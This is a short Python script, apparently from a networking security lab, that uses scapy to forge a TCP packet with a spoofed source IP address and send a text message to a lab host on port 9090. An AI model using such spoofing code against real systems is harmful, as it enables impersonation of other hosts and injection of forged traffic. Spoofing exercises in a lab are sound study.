from scapy.all import *

# Target info (spoofed)
src_ip = "10.9.0.5"  # HostA (spoofed sender)
dst_ip = "10.9.0.6"  # HostB (target)

# Create TCP packet (SYN or raw payload)
ip = IP(src=src_ip, dst=dst_ip)
tcp = TCP(sport=12345, dport=9090, flags="PA", seq=1000, ack=0)
data = "🚨 This is a spoofed message"

packet = ip / tcp / Raw(load=data)

# Send the spoofed packet
send(packet, iface="eth0")

